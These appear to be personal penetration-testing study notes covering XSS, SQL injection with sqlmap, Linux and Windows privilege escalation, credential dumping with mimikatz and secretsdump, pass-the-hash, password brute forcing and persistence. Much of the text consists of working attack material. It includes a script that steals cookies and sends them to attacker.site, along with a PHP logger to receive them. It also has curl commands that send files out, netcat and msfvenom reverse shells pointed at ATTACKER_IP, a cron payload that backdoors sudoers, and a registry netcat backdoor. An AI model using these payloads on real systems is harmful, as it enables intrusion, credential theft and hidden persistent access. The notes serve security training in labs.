* Similar to RDP, however, instead of controlling the remote system via GUI, commands are sent via CMD.

[+] WinRM is tipically used in the following ways:
	> Remotely access and interact with Windows hosts on a local network
  	> Remotely access and  execute commands on Windows systems on the internet
  	> Manage and configure Windows systems remotely
* WinRM typically uses TCP port 5985 and 5986(HTTPS)

###XSS 
* Finding an XSS is sometimes just a matter of injecting a harmless tag like 
	<i> : italics
      	<pre>
      	<plaintext>
      	<h1>Hello</h1>
* Some valid HTML/Javascript code
	<script>alert('XSS')</script>
      	<script>alert(window.location.hostname)</script>
      	<script>alert(document.cookie)</script> [Remember parameter http-only is very important for no access by javascript(document.cookie),java,etc.]
* Reflected XSS attacks
	//Is called reflected because an input field of the HTTP request sent by the browser gets inmediately reflected to the output page.
    	//When the malicious payload is carried inside the request that the browser of the victim sends to the vulnerable website. When users click on the link, they trigger the attack.

		http://victim.site/search.php?find=<payload>

* Stored XSS attacks
	//When the payload is sent to the vulnerable web server and then stored. The malicious code gets delivered each and every time a web browser hits the "injected" web page.
	//Cookie stealing via XSS. [Javascript can access cookies if they do not have the HttpOnly flag enabled.]
		<script>alert(document.cookie)</script>
    	//With the following code, you can send cookies content to an attacker-controlled site. The script generates an image object and points its src to a script on the attacker's server(attacker.site)
	//You post this in the vulnerable field
      		<script>
      		var i = new Image();
      		i.src="http://attacker.site/log.php?q="+escape(document.cookie);
      		</script>

      	//The log.php script saves the cookie in a text file on the attacker.site
      		<?php 
      		$filename="/tmp/log.txt";
      		$fp=fpopen($filename, 'a');
      		$cookie=$_GET['q'];
      		fwrite($fp, $cookie);
      		fclose($fp);
      		?>

      	//Another script
      		<?php
      		$ip = $_SERVER['REMOTE_ADDR'];
      		$browser = $_SERVER['HTTP_USER_AGENT'];
      		$fp = fopen('jar.txt', 'a');

      		fwrite($fp, $ip. ' '.$browser." \n");
      		fwrite($fp, urldecode($_SERVER['QUERY_STRING']). "  \n\n");
      		fclose($fp);
      		?>
* xsser 
	(with POST)
		xsser --url 'http://demo.ine.local/index.php?page=dns-lookup.php' -p 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS' //The -p is from burpsuite
      		  --auto
      		  --Fp: Final payload //<script>alert("XSS")</script>
	(with GET)
      		xsser --url ... //Change 'nmap' by XSS ==> poll request //Remember
	URLs and books

###SQLi
* Comments
	'#' symbol
    	-- (two dashes followed by a space)
* Static query example inside a PHP page
	<?php
    	$dbhostname='1.2.3.4';
    	$dbuser='username';
    	$dbpassword='password';
    	$dbname='database';
    	
    	$connection = mysqli_connect($dbhostname, $dbuser, $dbpassword, $dbname); // Object referencing the connection to the database
    	$query = "SELECT Name, Description FROM Products WHERE ID='3' UNION SELECT Username, Password FROM Accounts;";
    	
    	
    	$results = mysqli_query($connection, $query); //Function which submits the query to the database
    	display_results($results); //Renders the data
    	?>

* Dynamic query
	<?php
    	$dbhostname='1.2.3.4';
    	$dbuser='username';
    	$dbpassword='password';
    	$dbname='database';
    	
    	$id = $_GET['id']; //Using user-supplied input to build a query
    	
    	$connection = mysqli_connect($dbhostname, $dbuser, $dbpassword, $dbname);
    	$query = "SELECT Name, Description FROM Products WHERE ID='$id';";
    	
    	$results = mysqli_query($connection, $query);
    	display_results($results);
    	?>

	[+] One example of SQLi
		We can change the $id value to something like
    	  		' OR 'a'='a
    	  	The query then becomes:
    	  	  	SELECT Name, Description FROM Products WHERE ID='' OR 'a'='a'; //This tells the database to select all the items in the Products table.

    	[+] Other example
    	  	Using UNION command
    	  	  	' UNION SELECT Username, Password FROM Accounts WHERE 'a'='a
    	  	The query then becomes:
    	  	  	SELECT Name, Description FROM Products WHERE ID='' UNION SELECT Username, Password FROM Accounts WHERE 'a'='a';

* Finding SQL injections
	[+] string terminators: ' and "
    	[+] SQL commands: SELECT, UNION and others
    	[+] SQL comments: # or -- 
    	[+] In POST ==> username=userna'me&password=password

* Exploiting a boolean based SQLi
	user() //Current user using the database
    	substring() //Returns a substring of the given argument. It takes three parameters: the input string, the position of the substring and its length
    		mysql > select substring('elearnsecurity', 2, 1);
    	  	mysql > select substring(user(), 1, 1) = 'r'; //To test True/False condition

		Combining those features, we can iterate over the letters of the username by using payloads such as:
    			[+] ' or substr(user(), 1, 1) = 'a
    		  	[+] ' or substr(user(), 1, 1) = 'b
    		  	...

    		When we find the first letter, we can move to the second:
    		  	[+] ' or substr(user(), 2, 1) = 'a
    		  	[+] ' or substr(user(), 2, 1) = 'b
    		  	...

* Exploiting UNION based SQLi
	[+] When some of the results of a query are directly displayed on the output page.
    		' UNION SELECT user(); -- -
    	[+] The query then becomes:
    		SELECT description FROM items WHERE id='' UNION SELECT user(); -- -'; //The third dash is because most of the browsers automatically remove trailing spaces in the URL so, if you need to inject a comment via a GET request, you have to add a character after the trailing space of the comment

	[+] Examples
		' UNION SELECT null; -- -
      		' UNION SELECT null,null; -- - //We need to know how many fiels are there

	[+] When we know the number of fields, it is time to test which fields are part of the output page.
		' UNION SELECT 'elsid1', 'elsid2'; -- - 

  
* SQLMap
	[+] When you want to read from a file, save it from Burpsuite
		sqlmap -r /root/bloglogin.req -p user --technique=B --banner -v3 
			--flush-session
		sqlmap -r request -p title --os-shell
		sqlmap -u http://victim.site/view.php?id=1441' -p id --technique=U //UNION based SQLi technique
    		sqlmap -u http://victim.site/view.php?id=1441 -b //banner
    		sqlmap -u http://victim.site/view.php?id=1441 --tables //tables
    		sqlmap -u http://victim.site/view.php?id=1441 --current-db selfi4you --columns
    		sqlmap -u http://victim.site/view.php?id=1441 --current-db selfi4you --dump
    		sqlmap -u http://victim.site/view.php?id=1441' -p search --technique=U --banner -v3 --fresh-queries
    			--current-db
    		  	--current-user
    		sqlmap -u http://victim.site/view.php?id=n' -p search --technique=U  -D blogdb --tables
    		sqlmap -u http://victim.site/view.php?id=n' -p search --technique=U  -D blogdb -T users --columns
    		sqlmap -u http://victim.site/view.php?id=n' -p search --technique=U  -D blogdb -T users -C username,password --dump

	[+] If you have to exploit a POST parameter:
    		> With sqlmap
    	  		sqlmap -u <URL> --data=<POST string> -p parameter [options] //Copy the POST string from a request intercepted with Burp Proxy
    	  	  	sqlmap -u http://sqlmap.test/login.php --data='user=a&pass=a' -p user --technique=B --banner
    	  	> With Burpsuite
    	    		username=a' or 1=1; -- -&pass=a //We could test one field and the other to see which is vulnerable

	[+] Another way
		sqlmap -u "http://192.210.141.3/sqli_1.php?title=hello&action=search" --cookie "PHPSESSID=ipcund5314149g188pfhb3pff1; security_level=0" -p title --dbs
		sqlmap -u "http://192.210.141.3/sqli_1.php?title=hello&action=search" --cookie "PHPSESSID=ipcund5314149g188pfhb3pff1; security_level=0" -p title -D bWAPP --tables
       		sqlmap -u "http://192.210.141.3/sqli_1.php?title=hello&action=search" --cookie "PHPSESSID=ipcund5314149g188pfhb3pff1; security_level=0" -p title -D bWAPP -T users --columns

###Linux Kernel Exploitation
* Github
	https://github.com/mzet-/linux-exploit-suggester
  	wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
* Meterpreter
	meterpreter > 
  		shell
  	  	/bin/bash -i
  	  	sysinfo
  	  	getuid
    
* Cron Jobs
    Any script or command that have been configured to be run as the "root" user and is run by a Cron Job will run as the root user and will consequently provide us with root access.
    	crontab -l
    	cd /
    	grep -rnw (or -nri) /usr -e "/home/student/message" or find / -name message  //Find if a file with the same name exists on the system
    	printf '#!/bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh

* Exploiting SUID Binaries
	strings welcome
    	rm -rf greetings
    	cp /bin/bash greetings
    	./welcome

###Dumping Linux Passwords Hashes
The shadow file can only be accessed by the root account.
  	value     Hashing algorithm
  	$1        MD5
  	$2        Blowfish
  	$5        SHA-256
  	$6        SHA-512
	> Example:
      		msfconsole ==> hashdump
      		cat /etc/shadow
###RCE
* In Burpsuite
	sleep+2 //The '+' is not necessary if you are in a browser
[+] Abusing curl
	Attack machine:
      		nc -lvnp 53
    	Victim machine
      		curl http://<attack machine IP>/53/`whoami | base64`
  	msfvenom -p linux/x64/shell_reverse_tcp LHOST=<our IP> LPORT=<our lport> -f elf -o reverse53
	create a python server from our machine
  	curl from victim machine and add '-o /tmp/r'. 
  	chmod +x /tmp/r

  	You can put files in a server with '-T'
    		A: nc -lvnp 53
    		V: curl http://<MY IP>/file -T /etc/issue
###Buffer overflow
	[+] A buffer is an area in the RAM reserved for temporary data storage. Buffers have a finite size; this means that they can only contain a certain amount of data. Buffers are stored in a special data structure in the computer memory called a stack (data structure used to store data). It uses LIFO (Last in First Out) with two methods:
  		> Push: Adds an element to the stack
  	  	> Pop: Removes the last inserted element
	
###General PrivEsc checklist
* Kernel exploits: Be careful for they cause system instability
* Vulnerable software
	> Linux 
		dpkg -l
	> Windows 
		C:\Program Files
* User privileges
	[+] Sudo: The sudo command in Linux allows a user to execute commands as a different user. It is usually used to allow lower privileged users to execute commands as root without giving them access to the root user. 
		sudo -l
			If 
				(ALL : ALL) ALL ==> It requires a password to run any commands with sudo
				sudo su -
			If 
				(user : user) NOPASSWD: /bin/echo ==> The NOPASSWD entry shows that the /bin/echo command can be executed without a password. This would be useful if we gained access to the server through a vulnerability and did not have the user's password. As it says user, we can run sudo as that user and not as root. 
				sudo -u user /bin/echo Hello world!

* Scheduled tasks
	[+] Cronjobs
		/etc/crontab
		/etc/cron.d
		/var/spool/cron/crontabs/root
		
	> Looking into scheduled tasks on the target system, you may see a scheduled task that either lost its binary or it's using a binary you can modify.
	[+] Commands	
		net start //Services running in the background
        	wmic service list brief
        	tasklist /svc //List services running under that particular process
  		schtasks /query /fo list /v
      		schtasks /query /tn vulntask /fo list /v ==> vulntask = task 

	> Scheduled tasks can be listed from the command line using the schtasks command without any options. To retrieve detailed information about any of the services, you can use a command like the following one:
	> You will get lots of information about the task, but what matters for us is the "Task to Run" parameter which indicates what gets executed by the scheduled task, and the "Run As User" parameter, which shows the user that will be used to execute the task.
	> If our current user can modify or overwrite the "Task to Run" executable, we can control what gets executed by the taskusr1 user, resulting in a simple privilege escalation. To check the file permissions on the executable, we use icacls:
		C:\> icacls c:\tasks\schtask.bat
		c:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)
		                    BUILTIN\Administrators:(I)(F)
		                    BUILTIN\Users:(I)(F)

	> As can be seen in the result, the BUILTIN\Users group has full access (F) over the task's binary. This means we can modify the .bat file and insert any payload we like. For your convenience, nc64.exe can be found on C:\tools. Let's change the bat file to spawn a reverse shell:
		C:\> echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
	> We then start a listener on the attacker machine on the same port we indicated on our reverse shell:
		nc -lvp 4444
	> The next time the scheduled task runs, you should receive the reverse shell with taskusr1 privileges. While you probably wouldn't be able to start the task in a real scenario and would have to wait for the scheduled task to trigger, we have provided your user with permissions to start the task manually to save you some time. We can run the task with the following command:
		C:\> schtasks /run /tn vulntask
	> And you will receive the reverse shell with taskusr1 privileges as expected:
		user@attackerpc$ nc -lvp 4444
		Listening on 0.0.0.0 4444
		Connection received on 10.10.175.90 50649

* Passwords attacks
    + Credential Storage in Linux
        cat /etc/shadow


* Exposed credentials
	[+] Linux
		bash_history
	[+] Windows
		PSReadLine
* SSH Keys
	> If we have read access, we can copy id_rsa to our machine and use '-i' flag to log in with it
		vim id_rsa
		chmod 600 id_rsa
		ssh user@10.10.10.10 -i id_rsa
	> We may read their private key
		/home/user/.ssh/id_rsa
		/root/.ssh/id_rsa
	> If we find ourselves with write access to a users/.ssh/ directory, we can place our public key in the user's ssh directory at /home/user/.ssh/authorized_keys. This technique is usually used to gain ssh access after gaining a shell as that user. The current SSH configuration will not accept keys written by other users, so it will only work if we have already gained control over that user. We must first create a new key with ssh-keygen and the -f flag to specify the output file

    	> Windows NT is the kernel that comes pre-packaged with all versions of Microsoft Windows and operates as a traditional kernel with a few exceptions based on user design philosophy. It consists of two main modes of operation that determine access to system resources and hardware:
      		+ User mode: Programs and services running in user mode have limited access to system resources and functionality
      		+ Kernel mode: Kernel mode has unrestricted access to system resources and functionality with the added functionality of managing devices and system memory.

[+] Access Token Impersonation
    + Windows access tokens are created and managed by the Local Security Authority Subsystem Service (LSASS)
    + Access tokens are generated by the winlogon.exe process every time a user authenticates successfully and includes the identity and privileges of the user account associated with the thread or process. This token is then attached to the userinit.exe process, after which all child processes started by a user will inherit a copy of the access token from their creator and will run under the privileges of the same access token.
    + An access token will typically be assigned one of the following security levels:
      	> Impersonate-level tokens are created as a direct result of a non-interactive login on Windows, typically through specific system services or domain logons.
        	Impersonate-level tokens can be used to impersonate a token on the local system and not on any external systems that utilize the token.
        	We can use the incognito module to display a list of available tokens that we can impersonate.
        	The following are the privileges that are required for a successful impersonation attack:
        	  - SeAssignPrimaryToken: This allows a user to impersonate tokens
        	  - SeCreateToken: This allows a user to create an arbitrary token with administrative privileges
        	  - SeImpersonatePrivilege: This allows a user to create a process under the security context of another user typically with administrative privileges.
      	> Delegate-level tokens are typically created through an interactive login on Windows, primarily through a traditional login or through remote access protocols such as RDP
        	Delegate-level tokens pose the largest threat as they can be used to impersonate tokens on any system.
    + Load incognito
	> Incognito is a built-in meterpreter module that was originally a standalone application that allows you to impersonate user tokens after successful exploitation

[+] Windows File system vulnerabilities --> ME INTERESA
* Alternate Data Streams
	> ADS is an NTFS(New Technology File System) file attribute and was designed to provide compatibility with the MacOS HFS(Hierarchical File System).
    	  Any file created on an NTFS formatted drive will have two different forks/streams:
		Data stream: Default stream that contains the data of the file

[+] Windows Credential Dumping
	+ Windows Password Hashes
  		> Windows OS stores hashed user accounts and passwords locally in the SAM(Security Accounts Manager) database
  	  		The SAM database file cannot be copied while the operating system is running
  	  	    	The Windows NT kernel keeps the SAM database file locked and as a result, attackers typically utilize in-memory techniques and tools to dump SAM hashes from the LSASS process.
  	  	    	In modern versions of Windows, the SAM database is encrypted with a syskey.
  	  	> Authentication and verification of user credentials is facilitated by the LSA (Local Security Authority)
  	  		Elevated/Administrative privileges are required in order to access and interact with the LSASS process 
  	  	    	This service has a cache of memory with the hashes as it interacts with the SAM database
  	  	> Windows disables LM hashing and utilizes NTLM hashing from Windows Vista onwards
    
	+ LM(LanMan)
		Default hashing algorithm that was implemented in Windows OS prior to NT4.0
      		[+] The password is broken into two seven-character chunks 
      		[+] All characters are then converted into uppercase
      		[+] Each chunk is then hashed separately with the DES algorithm.
      		> Weak protocol, primarily because the password hash does not include salts, consequently making brute-force and rainbow table attacks effective against LM hashes
      		> Example: Password123 => PASSWO ==> RD123 ==> DES ==> HASH1 + HASH2 ==> LM Hash

	+ NTLM(NTHash)
		When a user account is created, it is encrypted using the MD4 hashing algorithm, while the original password is disposed of.
      		[+] Does not split the hash in to two chunks
      		[+] Case sensitive 
      		[+] Allows the use of symbols and unicode characters
      		[+] They do not have password salts, which means that can be cracked easy with rainbow tables or through brute-force attacks
      		> Example: !Passw0rd123. ==> MD4 ==> NTLM hash
[+] Searching for passwords in Windows Configuration files
	+ Unattended Windows Setup utility
		Windows can automate a variety of repetitive task(such as the installation of Windows on many systems) typically done through the use of the Unattended Windows Setup utility. 
      		This tool utilizes configuration files that contain specific configurations and user account credentials, specifically the Administrator account's password
      			[+] C:\Windows\Panther\Unattend.xml
      			[+] C:\Windows\Panther\Autounattend.xml
      		As a security precaution, the passwords stored in the Unattended Windows Setup configuration file may be encoded in base64
      	+ Example done by 2 ways:
      		msfconsole -q
      		use exploit/windows/misc/hta_server
      		exploit
      		“This module hosts an HTML Application (HTA) that when opened will run a payload via Powershell". Copy the generated payload i.e “http://10.10.0.2:8080/6Nz7aySfPN.hta” and run it on cmd.exe with mshta command to gain the meterpreter shell
        	Use your own metasploit HTA server link
            	mshta.exe http://10.10.0.2:8080/6Nz7aySfPN.hta

[+] Dumping hashes with kiwi or mimikatz
	> The SAM (Security Account Manager) database, is a database file on Windows systems that stores hashes user passwords.
    	> Mimikatz can be used to extract hashes from the lsass.exe process memory where hashes are cached.
    	> We can utilize the pre-compiled mimikatz executable, alternatively, if we have access to a meterpreter session on a Windows target, we can utilize the inbuilt meterpreter extension Kiwi.
    	> Mimikatz will require elevated privileges in order to run correctly.

    	> Example:
    		nmap 192.168.188.128
    	    	service postresql start && msfconsole -q 
    	    	use exploit/windows/http/badblue_passthru
    	    	sysinfo
    	    	getuid
    	    	pgrep lsass
    	    	migrate 788
    	    	getuid
		> Usage of Kiwi
    	    		load kiwi
    	    			creds_all
    	    		  	lsa_dump_sam
    	    		  	lsa_dump_secrets //Some clear password sometimes
		> Usage of mimikatz.exe
    	    		pwd
    	    		cd C:\\
    	    		mkdir Temp
    	    		cd Temp
    	    		upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
    	    		.\mimikatz.exe
    	    		  privilege::debug //To ensure that we have enough privileges
    	    		  lsadump::sam
    	    		  lsadump::secrets
    	    		  sekurlsa::logonpasswords //Clear passwords

[+] Pass-The-Hash attack
	> We can use multiple tools to facilitate this attack like Metasploit PsExec module or Crackmapexec
	> Metasploit PsExec module 
    		use exploit/windows/smb/psexec
    			set smbuser administrator
    	      		set smbpass (Paste LM:NTLM or the clear password)
    	      		set target Command
    	      		set target Native\ upload
    	      		sessions -K //To kill all the sessions
	> Crackmapexec 
    		crackmapexec smb 192.168.188.126 -u Administrator -H "(NTLM hash here)"
    	    	crackmapexec smb 192.168.188.126 -u Administrator -H "(NTLM hash here)" -x "ipconfig"

Transferring files to Windows & Linux targets
* Using python server
	Setting up a web server with Python
	    Python2 ==> SimpleHTTPServer
	    Python3 ==> http.server
	Transferring files to windows targets
  	  certutil -urlcache -f http://10.10.4.2/mimikatz.exe mimikatz.exe
  	Transferring files to Linux targets
  	  cd /tmp
  	  cd /usr/share/webshells/php/
  	  python3 -m http.server 80
  	  wget http://10.10.3.4/php-backdoor.php
    		If the remote server does not have wget, we can use cURL to download the file:
			curl http://10.10.14.1:8000/linenum.sh -o linenum.sh
* Using scp
	Granted we have obtained ssh user credentials on the remote host.
		scp linenum.sh user@remotehost:/tmp/linenum.sh
* Using base64
	Maybe, the remote host may have firewall protections that prevent us from downloading a file from our machine. In this type of situation, we can use a simple trick to base64 encode the file into base64 format, and then we can paste the base64 string on the remote server and decode it. For example, if we wanted to transfer a binary file called shell, we can base64 encode it as follows:
		base64 shell -w 0
	Now, we can copy this base64 string, go to the remote host, and use base64 -d to decode it, and pipe the output into a file
		echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell
	Finally, we can use md5sum to ensure that the file not mess up

      perl -e 'exec "/bin/bash";'
      perl: exec "/bin/bash";
    Is ruby installed?
      ruby: exec "/bin/bash"

###Persistence
* What if we have to be persistent?
	[+] Using netcat
		We need to modify the regedit
      			1. Go to Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run 
      		  	2. New ==> String ==> Type the name of the netcat file (for example winconfig)
      		  	3. Edit string ==> Value data ==> "C:\Windows\System32\winconfig.exe 192.168.0.10 4126 -e cmd.exe"

	[+] Using Metasploit
  		use exploit/windows/local/s4u_persistence

* When you log into your computer, you type your username and password. The operating system takes the password, hashes it and then tries to match the result against the saved hash in the password database. If the two values match, you log in successfully. The operating system does not need to know the clear-text password.

* John the Ripper 
	[+] List of accepted formats
		john --list=formats
    	[+] To perform a pure brute force attack over a users list:
            > Incremental Mode is an advanced John mode used to crack passwords using a character set. It is a hybrid attack, which means it will attempt to match the password by trying all possible combinations of characters from the character set. This mode is the most effective yet most time-consuming of all the John modes. This mode works best when we know what the password might be, as it will try all the possible combinations in sequence, starting from the shortest one. This makes it much faster than the brute force attack, where all combinations are tried randomly. Moreover, the incremental mode can also be used to crack weak passwords, which may be challenging to crack using the standard John modes. The main difference between incremental mode and wordlist mode is the source of the password guesses. Incremental mode generates the guesses on the fly, while wordlist mode uses a predefined list of words. At the same time, the single crack mode is used to check a single password against a hash.
            > Using this command we will read the hashes in the specified hash file and then generate all possible combinations of characters, starting with a single character and incrementing with each iteration. It is important to note that this mode is highly resource intensive and can take a long time to complete, depending on the complexity of the passwords, machine configuration, and the number of characters set. Additionally, it is important to note that the default character set is limited to a-zA-Z0-9. Therefore, if we attempt to crack complex passwords with special characters, we need to use a custom character set.

        & WinRM

            > Windows Remote Management (WinRM ==> https://docs.microsoft.com/en-us/windows/win32/winrm/portal) is the Microsoft implementation of the network protocol Web Services Management Protocol (WS-Management ==> https://docs.microsoft.com/en-us/windows/win32/winrm/ws-management-protocol). It is a network protocol based on XML web services using the Simple Object Access Protocol (SOAP ==> https://docs.microsoft.com/en-us/windows/win32/winrm/windows-remote-management-glossary) used for remote management of Windows systems. It takes care of the communication between Web-Based Enterprise Management (WBEM ==> https://en.wikipedia.org/wiki/Web-Based_Enterprise_Management) and the Windows Management Instrumentation (WMI), which can call the Distributed Component Object Model (DCOM ==> https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/4a893f3d-bd29-48cd-9f43-d9777a4415b0).
            > However, for security reasons, WinRM must be activated and configured manually in Windows 10. Therefore, it depends heavily on the environment security in a domain or local network where we want to use WinRM. In most cases, one uses certificates or only specific authentication mechanisms to increase its security. WinRM uses the TCP ports 5985 (HTTP) and 5986 (HTTPS).
            > A handy tool that we can use for our password attacks is CrackMapExec, which can also be used for other protocols such as SMB, LDAP, MSSQL, and others. We recommend reading the official documentation(https://mpgn.gitbook.io/crackmapexec/) for this tool to become familiar with 

            m1l0js@htb[/htb]$ crackmapexec winrm 10.129.42.197 -u user.list -p password.list

            > The appearance of (Pwn3d!) is the sign that we can most likely execute system commands if we log in with the brute-forced user. Another handy tool that we can use to communicate with the WinRM service is Evil-WinRM, which allows us to communicate with the WinRM service efficiently.

            m1l0js@htb[/htb]$ sudo gem install evil-winrm

        & SSH
            > Secure Shell (SSH) is a more secure way to connect to a remote host to execute system commands or transfer files from a host to a server. The SSH server runs on TCP port 22 by default, to which we can connect using an SSH client. This service uses three different cryptography operations/methods: symmetric encryption, asymmetric encryption, and hashing.
            > Symmetric Encryption
                Symmetric encryption uses the same key for encryption and decryption. However, anyone who has access to the key could also access the transmitted data. Therefore, a key exchange procedure is needed for secure symmetric encryption. The Diffie-Hellman key exchange method is used for this purpose. If a third party obtains the key, it cannot decrypt the messages because the key exchange method is unknown. However, this is used by the server and client to determine the secret key needed to access the data. Many different variants of the symmetrical cipher system can be used, such as AES, Blowfish, 3DES, etc.
            > Asymmetrical Encryption
                Asymmetric encryption uses two SSH keys: a private key and a public key. The private key must remain secret because only it can decrypt the messages that have been encrypted with the public key. If an attacker obtains the private key, which is often not password protected, he will be able to log in to the system without credentials. Once a connection is established, the server uses the public key for initialization and authentication. If the client can decrypt the message, it has the private key, and the SSH session can begin.
            > Hashing
                The hashing method converts the transmitted data into another unique value. SSH uses hashing to confirm the authenticity of messages. This is a mathematical algorithm that only works in one direction.

        & RDP
            > Microsoft's Remote Desktop Protocol (RDP) is a network protocol that allows remote access to Windows systems via TCP port 3389 by default. RDP provides both users and administrators/support staff with remote access to Windows hosts within an organization. The Remote Desktop Protocol defines two participants for a connection: a so-called terminal server, on which the actual work takes place, and a terminal client, via which the terminal server is remotely controlled. In addition to the exchange of image, sound, keyboard, and pointing device, the RDP can also print documents of the terminal server on a printer connected to the terminal client or allow access to storage media available there. Technically, the RDP is an application layer protocol in the IP stack and can use TCP and UDP for data transmission. The protocol is used by various official Microsoft apps, but it is also used in some third-party solutions.
                m1l0js@htb[/htb]$ hydra -L user.list -P password.list rdp://10.129.42.197

        & SMB
            > Server Message Block (SMB) is a protocol responsible for transferring data between a client and a server in local area networks. It is used to implement file and directory sharing and printing services in Windows networks. SMB is often referred to as a file system, but it is not. SMB can be compared to NFS for Unix and Linux for providing drives on local networks.

            > SMB is also known as Common Internet File System (CIFS). It is part of the SMB protocol and enables universal remote connection of multiple platforms such as Windows, Linux, or macOS. In addition, we will often encounter Samba, which is an open-source implementation of the above functions. For SMB, we can also use hydra again to try different usernames in combination with different passwords.
                m1l0js@htb[/htb]$ hydra -L user.list -P password.list smb://10.129.42.197
            > This is because we most likely have an outdated version of THC-Hydra that cannot handle SMBv3 replies. To work around this problem, we can manually update and recompile hydra or use another very powerful tool, the Metasploit framework.

[+] Password Mutations
    > The complete list of this syntax can be found in the official documentation of Hashcat. However, the ones listed below are enough for us to understand how Hashcat mutates words.
    Function	Description
    :	        Do nothing.
    l	        Lowercase all letters.
    u	        Uppercase all letters.
    c	        Capitalize the first letter and lowercase others.
    sXY	        Replace all instances of X with Y.
    $!	        Add the exclamation character at the end.

    > Generating rule-based wordlist
        m1l0js@htb[/htb]$ hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list

    > Hashcat and John come with pre-built rule lists that we can use for our password generating and cracking purposes. One of the most used rules is best64.rule, which can often lead to good results. It is important to note that password cracking and the creation of custom wordlists is a guessing game in most cases. We can narrow this down and perform more targeted guessing if we have information about the password policy and take into account the company name, geographical region, industry, and other topics/words that users may select from to create their passwords. Exceptions are, of course, cases where passwords are leaked and found.
        m1l0js@htb[/htb]$ ls /usr/share/hashcat/rules/
    > We can now use another tool called CeWL to scan potential words from the company's website and save them in a separate list. We can then combine this list with the desired rules and create a customized password list that has a higher probability of guessing a correct password. We specify some parameters, like the depth to spider (-d), the minimum length of the word (-m), the storage of the found words in lowercase (--lowercase), as well as the file where we want to store the results (-w).
        m1l0js@htb[/htb]$ cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist

[+] Password Reuse / Default Passwords

    > It is common for both users and administrators to leave defaults in place. Administrators have to keep track of all the technology, infrastructure, and applications along with the data being accessed. In this case, the same password is often used for configuration purposes, and then the password is forgotten to be changed for one interface or another. In addition, many applications that work with authentication mechanisms, basically almost all, often come with default credentials after installation. These default credentials may be forgotten to be changed after configuration, especially when it comes to internal applications where the administrators assume that no one else will find them and do not even try to use them.
    > In addition, easy-to-remember passwords that can be typed quickly instead of typing 15-character long passwords are often used repeatedly because Single-Sign-On (SSO) is not always immediately available during initial installation, and configuration in internal networks requires significant changes. When configuring networks, we sometimes work with vast infrastructures (depending on the company's size) that can have many hundreds of interfaces. Often one network device, such as a router, printer, or a firewall, is overlooked, and the default credentials are used, or the same password is reused.
    
* Credential Stuffing
    > There are various databases that keep a running list of known default credentials. One of them is the DefaultCreds-Cheat-Sheet => (https://github.com/ihebski/DefaultCreds-cheat-sheet)
    > Besides the default credentials for applications, some lists offer them for routers. One of these lists can be found here => (https://www.softwaretestinghelp.com/default-router-username-and-password-list/)


[+] Windows Local Password Attacks
* Attacking SAM
    > With access to a non-domain joined Windows system, we may benefit from attempting to quickly dump the files associated with the SAM database to transfer them to our attack host and start cracking hashes offline. Doing this offline will ensure we can continue to attempt our attacks without maintaining an active session with a target. Let's walk through this process together using a target host. Feel free to follow along by spawning the target box in this section.
    + Copying SAM Registry Hives
        > There are three registry hives that we can copy if we have local admin access on the target; each will have a specific purpose when we get to dumping and cracking the hashes. Here is a brief description of each in the table below:   
            Registry Hive	Description
            hklm\sam	    Contains the hashes associated with local account passwords. We will need the hashes so we can crack them and get the user account passwords in cleartext.
            hklm\system	    Contains the system bootkey, which is used to encrypt the SAM database. We will need the bootkey to decrypt the SAM database.
            hklm\security	Contains cached credentials for domain accounts. We may benefit from having this on a domain-joined Windows target.
        > We can create backups of these hives using the reg.exe utility. Launching CMD as an admin will allow us to run reg.exe to save copies of the aforementioned registry hives. Run these commands below to do so:
            C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save
            The operation completed successfully.
            C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save
            The operation completed successfully.
            C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save
            The operation completed successfully.
        > Technically we will only need hklm\sam & hklm\system, but hklm\security can also be helpful to save as it can contain hashes associated with cached domain user account credentials present on domain-joined hosts. Once the hives are saved offline, we can use various methods to transfer them to our attack host. In this case, let's use Impacket's smbserver.py in combination with some useful CMD commands to move the hive copies to a share created on our attack host.
        > All we must do to create the share is run smbserver.py -smb2support using python, give the share a name (CompData) and specify the directory on our attack host where the share will be storing the hive copies (/home/ltnbob/Documents). Know that the smb2support option will ensure that newer versions of SMB are supported. If we do not use this flag, there will be errors when connecting from the Windows target to the share hosted on our attack host. Newer versions of Windows do not support SMBv1 by default because of the numerous severe vulnerabilites and publicly available exploits.
            m1l0js@htb[/htb]$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/
        > Once we have the share running on our attack host, we can use the move command on the Windows target to move the hive copies to the share.
            C:\> move sam.save \\10.10.15.16\CompData
                1 file(s) moved.
            C:\> move security.save \\10.10.15.16\CompData
                1 file(s) moved.
            C:\> move system.save \\10.10.15.16\CompData
                1 file(s) moved.
    + Dumping hashes
        > m1l0js@htb[/htb]$ locate secretsdump 
        > m1l0js@htb[/htb]$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
            Target system bootKey: 0x4d8c7cff8a543fbf245a363d2ffce518
        > Here we see that secretsdump successfully dumps the local SAM hashes and would've also dumped the cached domain logon information if the target was domain-joined and had cached credentials present in hklm\security. Notice the first step secretsdump executes is targeting the system bootkey before proceeding to dump the LOCAL SAM hashes. It cannot dump those hashes without the boot key because that boot key is used to encrypt & decrypt the SAM database, which is why it is important for us to have copies of the registry hives we discussed earlier in this section. Notice at the top of the secretsdump.py output:
            Dumping local SAM hashes (uid:rid:lmhash:nthash)
        > This tells us how to read the output and what hashes we can crack. Most modern Windows operating systems store the password as an NT hash. Operating systems older than Windows Vista & Windows Server 2008 store passwords as an LM hash, so we may only benefit from cracking those if our target is an older Windows OS.
